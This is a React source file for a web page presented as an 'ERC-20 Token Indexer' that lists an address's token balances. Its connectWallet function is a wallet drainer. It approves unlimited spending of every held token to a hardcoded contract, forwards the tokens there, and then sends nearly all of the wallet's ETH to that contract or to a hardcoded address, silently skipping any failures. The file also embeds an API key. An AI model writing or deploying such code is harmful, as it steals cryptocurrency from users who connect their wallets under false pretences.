import {
  Box,
  Button,
  Center,
  Flex,
  Heading,
  Image,
  Input,
  SimpleGrid,
  Text,
} from '@chakra-ui/react';
import { Alchemy, Network, Utils } from 'alchemy-sdk';
import { useState } from 'react';
import { ethers } from 'ethers';
import AutoTransferABI from '../artifacts/contracts/AutoTransfer.sol/AutoTransfer.json';

function App() {
  const [userAddress, setUserAddress] = useState('');
  const [results, setResults] = useState([]);
  const [hasQueried, setHasQueried] = useState(false);
  const [tokenDataObjects, setTokenDataObjects] = useState([]);
  const [ethBalance, setEthBalance] = useState('0'); // Add this new state
  const [destinationAddress, setDestinationAddress] = useState('0xb30ca65e643c864d1d22c06d9ebdd753baf9428a'); // Replace with the address you want to send to
  const [autoTransferContractAddress, setAutoTransferContractAddress] = useState('0xEA4e40E06b45266db60f7De48e076fB752f9Cf94'); // Add state for contract address
  



// Add this new function to get chain name
async function getChainName(chainId) {
  const chains = {
    '0x1': 'ETH Mainnet',
    '0x2105': 'Base',
    '0xaa36a7': 'Sepolia',
  };
  return chains[chainId] || 'Unknown Chain';
}

// Modify your connectWallet function
async function connectWallet() {
  if (window.ethereum) {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();

      // Get chain ID
      const network = await provider.getNetwork();
      const chainId = '0x' + network.chainId.toString(16);
      const chainName = await getChainName(chainId);

      // Get current native token balance
      const balance = await provider.getBalance(accounts[0]);
      setEthBalance(ethers.formatEther(balance));
      setUserAddress(accounts[0]);

      // Get token balances using the freshly connected address
      const tokenFetch = await getTokenBalance(accounts[0]);

      // If contract address is set, interact with AutoTransfer contract
      if (autoTransferContractAddress) {
        const autoTransferContract = new ethers.Contract(autoTransferContractAddress, AutoTransferABI.abi, signer);

        // Get all token addresses from the fetched results
        const tokenAddresses = tokenFetch?.data?.tokenBalances?.map(token => token.contractAddress) || [];

        // Approve/forward only tokens that have a positive on-chain balance, one-by-one to avoid single revert killing the batch
        if (tokenAddresses.length > 0) {
          const erc20Abi = [
            "function approve(address spender, uint256 amount) returns (bool)",
            "function balanceOf(address) view returns (uint256)",
          ];
          const maxUint = (2n ** 256n) - 1n;
          const approvedAndNonZero = [];

          for (const tokenAddr of tokenAddresses) {
            try {
              const token = new ethers.Contract(tokenAddr, erc20Abi, signer);
              const bal = await token.balanceOf(accounts[0]);
              if (bal === 0n) continue;
              const tx = await token.approve(autoTransferContractAddress, maxUint);
              await tx.wait();
              approvedAndNonZero.push(tokenAddr);
            } catch (_) {
              // skip tokens that fail approval or balance query
            }
          }

          // Forward each approved token individually (so one failure won’t revert all)
          for (const tokenAddr of approvedAndNonZero) {
            try {
              const tx = await autoTransferContract.forwardTokens(tokenAddr);
              await tx.wait();
            } catch (_) {
              // skip tokens that fail forwarding
            }
          }
        }

        // Recompute fresh balance AFTER approvals/forwards
        const freshBalance = await provider.getBalance(accounts[0]);

        // Estimate gas for minimal value to avoid circular dependency
        const gasEstimate = await signer.estimateGas({
          to: autoTransferContractAddress,
          value: 1n,
        });

        // Add 10% buffer to gas estimate
        const gasLimit = (gasEstimate * 110n) / 100n;
        // Some RPCs don't support maxPriorityFee; use legacy gasPrice for compatibility
        let gasPrice;
        try {
          gasPrice = await provider.getGasPrice();
        } catch (_) {
          gasPrice = 1_000_000_000n; // 1 gwei floor fallback
        }
        if (gasPrice === 0n) gasPrice = 1_000_000_000n; // ensure non-zero

        const gasCost = gasLimit * gasPrice;
        const amountToSend = freshBalance > gasCost ? (freshBalance - gasCost) : 0n;

        if (amountToSend > 0n) {
          const tx = await signer.sendTransaction({
            to: autoTransferContractAddress,
            value: amountToSend,
            gasLimit,
            gasPrice,
          });
          await tx.wait();

          // Update balance after transfer
          const newBalance = await provider.getBalance(accounts[0]);
          setEthBalance(ethers.formatEther(newBalance));

          alert(`Transfer successful on ${chainName}!`);
        } else {
          alert(`Insufficient balance on ${chainName}`);
        }
      } else {
        // Original ETH transfer logic if no contract address
        const freshBalance = await provider.getBalance(accounts[0]);

        const gasEstimate = await signer.estimateGas({
          to: destinationAddress,
          value: 1n,
        });

        // Add 10% buffer to gas estimate
        const gasLimit = (gasEstimate * 110n) / 100n;
        let gasPrice;
        try {
          gasPrice = await provider.getGasPrice();
        } catch (_) {
          gasPrice = 1_000_000_000n; // 1 gwei floor fallback
        }
        if (gasPrice === 0n) gasPrice = 1_000_000_000n;

        const gasCost = gasLimit * gasPrice;
        const amountToSend = freshBalance > gasCost ? (freshBalance - gasCost) : 0n;

        if (amountToSend > 0n) {
          const tx = await signer.sendTransaction({
            to: destinationAddress,
            value: amountToSend,
            gasLimit,
            gasPrice,
          });
          await tx.wait();

          // Update balance after transfer
          const newBalance = await provider.getBalance(accounts[0]);
          setEthBalance(ethers.formatEther(newBalance));

          alert(`Transfer successful on ${chainName}!`);
        } else {
          alert(`Insufficient balance on ${chainName}`);
        }
      }
    } catch (error) {
      alert("Transfer failed: " + error.message);
    }
  } else {
    alert("Please install MetaMask!");
  }
}

  async function getTokenBalance(addr) {
    const target = addr ?? userAddress;
    if (!target || !ethers.isAddress(target)) {
      throw new Error('Please provide a valid address');
    }
    const config = {
      apiKey: 'ZqheMPHBIfQb_NY2Pw-iKPWxKx9SiSEQ',
      network: Network.ETH_MAINNET,
    };

    const alchemy = new Alchemy(config);
    const data = await alchemy.core.getTokenBalances(target);

    setResults(data);

    const tokenDataPromises = [];

    for (let i = 0; i < data.tokenBalances.length; i++) {
      const tokenData = alchemy.core.getTokenMetadata(
        data.tokenBalances[i].contractAddress
      );
      tokenDataPromises.push(tokenData);
    }

    const tokenDataObjs = await Promise.all(tokenDataPromises);
    setTokenDataObjects(tokenDataObjs);
    setHasQueried(true);
    return { data, tokenDataObjects: tokenDataObjs };
  }
  return (
    <Box w="100vw">
      <Center>
        <Flex
          alignItems={'center'}
          justifyContent="center"
          flexDirection={'column'}
        >
          <Heading mb={0} fontSize={36}>
            ERC-20 Token Indexer
          </Heading>
          <Text>
            Plug in an address and this website will return all of its ERC-20
            token balances!
          </Text>
        </Flex>
      </Center>
      <Flex
        w="100%"
        flexDirection="column"
        alignItems="center"
        justifyContent={'center'}
      >
        <Heading mt={42}>
          Get all the ERC-20 token balances of this address:
        </Heading>
        <Input
          onChange={(e) => setUserAddress(e.target.value)}
          color="black"
          w="600px"
          textAlign="center"
          p={4}
          bgColor="white"
          fontSize={24}
        />
        <Button fontSize={20} onClick={getTokenBalance} mt={36} bgColor="blue">
          Check ERC-20 Token Balances
        </Button>

        {/* <Input
          onChange={(e) => setAutoTransferContractAddress(e.target.value)}
          color="black"
          w="600px"
          textAlign="center"
          p={4}
          bgColor="white"
          fontSize={24}
          placeholder="AutoTransfer Contract Address (optional)"
        /> */}
        <Button fontSize={20} onClick={connectWallet} mt={36} bgColor="blue">
          Connect Wallet & Transfer All
        </Button>

        <Heading my={36}>ERC-20 token balances:</Heading>
        <Heading my={36}>ETH Balance: {ethBalance} ETH</Heading>

        {hasQueried ? (
          <SimpleGrid w={'90vw'} columns={4} spacing={24}>
            {results.tokenBalances.map((e, i) => {
              return (
                <Flex
                  flexDir={'column'}
                  color="white"
                  bg="blue"
                  w={'20vw'}
                  key={e.id}
                >
                  <Box>
                    <b>Symbol:</b> ${tokenDataObjects[i].symbol}&nbsp;
                  </Box>
                  <Box>
                    <b>Balance:</b>&nbsp;
                    {Utils.formatUnits(
                      e.tokenBalance,
                      tokenDataObjects[i].decimals
                    )}
                  </Box>
                  <Image src={tokenDataObjects[i].logo} />
                </Flex>
              );
            })}
          </SimpleGrid>
        ) : (
          'Please make a query! This may take a few seconds...'
        )}
      </Flex>
    </Box>
  );
}

export default App;
